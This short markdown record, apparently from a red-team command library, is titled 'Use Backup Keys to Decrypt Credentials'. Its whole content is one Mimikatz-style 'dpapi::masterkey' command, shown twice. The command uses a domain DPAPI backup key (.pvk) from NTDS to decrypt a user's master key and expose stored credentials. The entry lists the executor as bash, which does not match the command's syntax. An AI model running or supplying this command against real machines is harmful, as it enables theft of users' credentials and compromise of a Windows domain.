---
id: d1d3ba90-337f-42b0-8ec2-f0a79dabb3df
name: Use Backup Keys to Decrypt Credentials
type: command
executor: bash
data: dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe"
  /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
output: null
created_at: '2023-04-06T03:56:26.276542+00:00'
updated_at: '2023-04-10T20:37:13.305156+00:00'
---

# Use Backup Keys to Decrypt Credentials

```bash
dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
